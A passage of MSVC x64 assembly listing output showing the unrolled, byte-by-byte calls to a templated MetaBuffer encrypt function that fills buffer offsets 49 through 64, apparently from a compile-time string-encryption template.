  00829	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0082e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00835	88 41 31	 mov	 BYTE PTR [rcx+49], al
  00838	b8 01 00 00 00	 mov	 eax, 1
  0083d	48 6b c0 31	 imul	 rax, rax, 49		; 00000031H
  00841	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00848	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0084c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00853	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00858	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0085f	88 41 32	 mov	 BYTE PTR [rcx+50], al
  00862	b8 01 00 00 00	 mov	 eax, 1
  00867	48 6b c0 32	 imul	 rax, rax, 50		; 00000032H
  0086b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00872	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00876	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0087d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00882	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00889	88 41 33	 mov	 BYTE PTR [rcx+51], al
  0088c	b8 01 00 00 00	 mov	 eax, 1
  00891	48 6b c0 33	 imul	 rax, rax, 51		; 00000033H
  00895	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0089c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008a0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008a7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  008ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008b3	88 41 34	 mov	 BYTE PTR [rcx+52], al
  008b6	b8 01 00 00 00	 mov	 eax, 1
  008bb	48 6b c0 34	 imul	 rax, rax, 52		; 00000034H
  008bf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008c6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008ca	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008d1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  008d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008dd	88 41 35	 mov	 BYTE PTR [rcx+53], al
  008e0	b8 01 00 00 00	 mov	 eax, 1
  008e5	48 6b c0 35	 imul	 rax, rax, 53		; 00000035H
  008e9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008f0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008f4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008fb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00900	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00907	88 41 36	 mov	 BYTE PTR [rcx+54], al
  0090a	b8 01 00 00 00	 mov	 eax, 1
  0090f	48 6b c0 36	 imul	 rax, rax, 54		; 00000036H
  00913	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0091a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0091e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00925	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0092a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00931	88 41 37	 mov	 BYTE PTR [rcx+55], al
  00934	b8 01 00 00 00	 mov	 eax, 1
  00939	48 6b c0 37	 imul	 rax, rax, 55		; 00000037H
  0093d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00944	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00948	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0094f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00954	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0095b	88 41 38	 mov	 BYTE PTR [rcx+56], al
  0095e	b8 01 00 00 00	 mov	 eax, 1
  00963	48 6b c0 38	 imul	 rax, rax, 56		; 00000038H
  00967	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0096e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00972	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00979	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0097e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00985	88 41 39	 mov	 BYTE PTR [rcx+57], al
  00988	b8 01 00 00 00	 mov	 eax, 1
  0098d	48 6b c0 39	 imul	 rax, rax, 57		; 00000039H
  00991	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00998	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0099c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009a3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  009a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009af	88 41 3a	 mov	 BYTE PTR [rcx+58], al
  009b2	b8 01 00 00 00	 mov	 eax, 1
  009b7	48 6b c0 3a	 imul	 rax, rax, 58		; 0000003aH
  009bb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  009c2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  009c6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009cd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  009d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009d9	88 41 3b	 mov	 BYTE PTR [rcx+59], al
  009dc	b8 01 00 00 00	 mov	 eax, 1
  009e1	48 6b c0 3b	 imul	 rax, rax, 59		; 0000003bH
  009e5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  009ec	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  009f0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009f7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  009fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a03	88 41 3c	 mov	 BYTE PTR [rcx+60], al
  00a06	b8 01 00 00 00	 mov	 eax, 1
  00a0b	48 6b c0 3c	 imul	 rax, rax, 60		; 0000003cH
  00a0f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a16	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a1a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a21	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00a26	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a2d	88 41 3d	 mov	 BYTE PTR [rcx+61], al
  00a30	b8 01 00 00 00	 mov	 eax, 1
  00a35	48 6b c0 3d	 imul	 rax, rax, 61		; 0000003dH
  00a39	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a40	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a44	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a4b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00a50	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a57	88 41 3e	 mov	 BYTE PTR [rcx+62], al
  00a5a	b8 01 00 00 00	 mov	 eax, 1
  00a5f	48 6b c0 3e	 imul	 rax, rax, 62		; 0000003eH
  00a63	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a6a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a6e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a75	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00a7a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a81	88 41 3f	 mov	 BYTE PTR [rcx+63], al
  00a84	b8 01 00 00 00	 mov	 eax, 1
  00a89	48 6b c0 3f	 imul	 rax, rax, 63		; 0000003fH
  00a8d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a94	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a98	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a9f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00aa4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00aab	88 41 40	 mov	 BYTE PTR [rcx+64], al
  00aae	b8 01 00 00 00	 mov	 eax, 1
  00ab3	48 6b c0 40	 imul	 rax, rax, 64		; 00000040H
  00ab7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00abe	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00ac2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
